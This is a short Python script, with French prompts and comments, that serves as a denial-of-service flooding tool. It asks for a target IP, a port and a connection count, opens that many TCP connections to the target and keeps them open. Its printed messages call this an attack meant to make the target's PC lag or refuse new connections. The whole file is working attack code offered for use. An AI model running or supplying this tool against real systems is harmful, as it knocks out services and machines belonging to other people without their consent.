import socket

# CONFIGURATION
target_ip = input("Entrez une IP : ")
target_port = int(input("Entrez un port : "))       
num_connections = int(input("Entrez un nombre de connexions : "))

def flood():
    print(f"Attaque en cours sur {target_ip}:{target_port}...")
    sockets = []
    
    for i in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            sockets.append(s)
            
            # affichage de progression
            if i % 100 == 0:
                print(f"Connexions ouvertes : {len(sockets)}")
                
        except Exception as e:
            print(f"Erreur à la connexion {i}: {e}")
            break
            
    print(f"Envoi terminé. {len(sockets)} connexions maintenues.")
    print("Le PC de la cible devrait laguer ou refuser les nouvelles connexions.")
    
    # sockets ouverts
    input("Appuie sur Entrée pour fermer les connexions...")
    
    for s in sockets:
        try: s.close()
        except: pass

if __name__ == "__main__":
    flood()